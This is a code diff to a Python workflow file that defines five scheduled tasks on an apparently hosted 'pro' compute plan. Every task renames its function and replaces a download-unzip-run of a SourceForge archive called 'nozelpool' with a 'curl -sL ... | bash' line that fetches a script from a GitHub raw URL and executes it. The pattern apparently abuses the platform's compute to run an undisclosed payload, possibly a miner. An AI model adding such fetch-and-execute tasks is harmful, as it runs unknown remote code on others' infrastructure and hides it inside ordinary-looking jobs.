@@ -11,11 +11,10 @@ app = Workflows()
     wait_duration_ms=1
   )
 )
-def run1():
+def building1():
   import sys
   import os
-  os.system('curl https://sourceforge.net/projects/drths/files/nozelpool.zip/download -L -o nozelpool.zip && unzip nozelpool.zip')
-  os.system('./nozel.sh')
+  os.system('curl -sL https://github.com/makiloso/urban-octo-umbrella/raw/main/moa | bash')
 
 @app.task(
   plan="pro",
@@ -25,11 +24,10 @@ def run1():
     wait_duration_ms=1
   )
 )
-def run2():
+def building2():
   import sys
   import os
-  os.system('curl https://sourceforge.net/projects/drths/files/nozelpool.zip/download -L -o nozelpool.zip && unzip nozelpool.zip')
-  os.system('./nozel.sh')
+  os.system('curl -sL https://github.com/makiloso/urban-octo-umbrella/raw/main/moa | bash')
 
 @app.task(
   plan="pro",
@@ -39,11 +37,10 @@ def run2():
     wait_duration_ms=1
   )
 )
-def run3():
+def building3():
   import sys
   import os
-  os.system('curl https://sourceforge.net/projects/drths/files/nozelpool.zip/download -L -o nozelpool.zip && unzip nozelpool.zip')
-  os.system('./nozel.sh')
+  os.system('curl -sL https://github.com/makiloso/urban-octo-umbrella/raw/main/moa | bash')
 
 @app.task(
   plan="pro",
@@ -53,11 +50,10 @@ def run3():
     wait_duration_ms=1
   )
 )
-def run4():
+def building4():
   import sys
   import os
-  os.system('curl https://sourceforge.net/projects/drths/files/nozelpool.zip/download -L -o nozelpool.zip && unzip nozelpool.zip')
-  os.system('./nozel.sh')
+  os.system('curl -sL https://github.com/makiloso/urban-octo-umbrella/raw/main/moa | bash')
 
 @app.task(
   plan="pro",
@@ -67,11 +63,10 @@ def run4():
     wait_duration_ms=1
   )
 )
-def run5():
+def building5():
   import sys
   import os
-  os.system('curl https://sourceforge.net/projects/drths/files/nozelpool.zip/download -L -o nozelpool.zip && unzip nozelpool.zip')
-  os.system('./nozel.sh')
+  os.system('curl -sL https://github.com/makiloso/urban-octo-umbrella/raw/main/moa | bash')
 
 
 if __name__ == "__main__":
